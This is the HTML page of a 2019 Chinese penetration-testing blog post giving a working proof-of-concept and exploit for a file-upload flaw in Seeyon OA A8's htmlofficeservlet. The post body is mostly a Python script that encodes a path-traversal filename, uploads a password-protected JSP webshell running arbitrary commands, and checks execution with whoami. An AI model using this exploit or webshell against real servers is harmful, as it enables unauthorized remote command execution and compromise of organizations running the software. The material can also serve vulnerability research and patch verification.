<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="致远 OA-A8 系统的 Servlet 接口存在漏洞，可通过 /seeyon/htmlofficeservlet 直接getsehll"/>
  <meta name="author" content="Reber"/>
  
    
      <title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</h1>
      
<div class="post-meta">
    <time>2019-06-29</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/getshell">getshell</a>)
</div>

      <div>

<h3 id="0x00-影响版本">0x00 影响版本</h3>

<ul>
<li>致远A8-V5协同管理软件 V6.1sp1</li>
<li>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3</li>
<li>致远A8+协同管理软件 V7.1</li>
</ul>

<h3 id="0x01-查看接口看是否存在漏洞">0x01 查看接口看是否存在漏洞</h3>

<p>如果查看 <code>&quot;seeyon/htmlofficeservlet&quot;</code> 接口，出现如下内容则表示存在漏洞
<img src="/img/post/Xnip2019-06-29_09-43-32.png" alt="70" /></p>

<h3 id="0x02-poc-exp">0x02 POC &amp; EXP</h3>

<pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import random
import string
import requests

info = {
    &quot;name&quot;: &quot;致远 A8 可 getshell&quot;,
    &quot;author&quot;: &quot;reber&quot;,
    &quot;version&quot;: &quot;致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1&quot;,
    &quot;type&quot;: &quot;file_upload&quot;,
    &quot;level&quot;: &quot;high&quot;,
    &quot;result&quot;: &quot;&quot;,
    &quot;status&quot;: False,
    &quot;references&quot;: &quot;&lt;url&gt;&quot;,
    &quot;desc&quot;: &quot;&lt;vul describtion&gt;&quot;,
}

def assign(service, arg):
   if service == 'seeyon':
       return True, arg

def encode(origin_bytes):
    &quot;&quot;&quot;
    重构 base64 编码函数
    &quot;&quot;&quot;
    # 将每一位bytes转换为二进制字符串
    base64_charset = &quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&quot;
    base64_bytes = ['{:0&gt;8}'.format(bin(ord(b)).replace('0b', '')) for b in origin_bytes]

    resp = ''
    nums = len(base64_bytes) // 3
    remain = len(base64_bytes) % 3

    integral_part = base64_bytes[0:3 * nums]
    while integral_part:
        # 取三个字节，以每6比特，转换为4个整数
        tmp_unit = ''.join(integral_part[0:3])
        tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
        # 取对应base64字符
        resp += ''.join([base64_charset[i] for i in tmp_unit])
        integral_part = integral_part[3:]

    if remain:
        # 补齐三个字节，每个字节补充 0000 0000
        remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8
        # 取三个字节，以每6比特，转换为4个整数
        # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
        tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
        resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='

    return resp

def verify(arg):
    url = arg + &quot;/seeyon/htmlofficeservlet&quot;
    tmp_random_str = ''.join(random.sample(string.letters+string.digits, 10))
    headers = {
        &quot;Pragma&quot;: &quot;no-cache&quot;,
        &quot;Cache-Control&quot;: &quot;no-cache&quot;,
        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,
        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,
        &quot;Connection&quot;: &quot;close&quot;,
        &quot;Content-Length&quot;: &quot;429&quot;,
    }
    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\shXi3GAEuT.txt')
    payload = &quot;DBSTEP V3.0     355             0               10             DBSTEP=OKMLlKlV\r\n&quot;
    payload += &quot;OPTION=S3WYOSWLBSGr\r\n&quot;
    payload += &quot;currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n&quot;
    payload += &quot;CREATEDATE=wUghPB3szB3Xwg66\r\n&quot;
    payload += &quot;RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n&quot;
    payload += &quot;originalFileId=wV66\r\n&quot;
    payload += &quot;originalCreateDate=wUghPB3szB3Xwg66\r\n&quot;
    payload += &quot;FILENAME={}\r\n&quot;.format(file_name)
    payload += &quot;needReadFile=yRWZdAS6\r\n&quot;
    payload += &quot;originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n&quot;
    payload += &quot;a{}&quot;.format(tmp_random_str)

    try:
        requests.post(url=url, data=payload, headers=headers)
        
        upfile_url = arg+&quot;/seeyon/shXi3GAEuT.txt&quot;
        time.sleep(2)
        resp = requests.get(url=upfile_url)
        code = resp.status_code
        content = resp.text
    except Exception as e:
        # print str(e)
        pass
    else:
        if code==200 and tmp_random_str[1:] in content:
            info['status'] = True
            info['result'] = &quot;{} 可直接getshell, 测试文件路径: {}&quot;.format(arg,upfile_url)

def attack(arg):
    url = arg + &quot;/seeyon/htmlofficeservlet&quot;
    headers = {
        &quot;Pragma&quot;: &quot;no-cache&quot;,
        &quot;Cache-Control&quot;: &quot;no-cache&quot;,
        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,
        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,
        &quot;Connection&quot;: &quot;close&quot;,
        &quot;Content-Length&quot;: &quot;429&quot;,
    }
    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\qwer960452.jsp')
    payload = &quot;&quot;&quot;DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
OPTION=S3WYOSWLBSGr\r
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
CREATEDATE=wUghPB3szB3Xwg66\r
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
originalFileId=wV66\r
originalCreateDate=wUghPB3szB3Xwg66\r
FILENAME=&quot;&quot;&quot;+file_name+&quot;&quot;&quot;\r
needReadFile=yRWZdAS6\r
originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if(&quot;el38A9485&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;)) + &quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;6e4f045d4b8506bf492ada7e3390d7ce&quot;&quot;&quot;

    requests.post(url=url, data=payload, headers=headers)
    resp = requests.get(arg+'/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+echo+ekwjkjrwre')
    if 'ekwjkjrwre' in resp.text:
        print &quot;{} 的 webshell 路径: {}&quot;.format(arg,arg+'/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+whoami')
</code></pre>

<h3 id="0x03-执行得到结果">0x03 执行得到结果</h3>

<!-- ![](/img/post/Xnip2019-06-29_09-53-16.png) -->

<p><img src="/img/post/Xnip2019-06-29_09-57-11.png" alt="80" /></p>
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2022
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
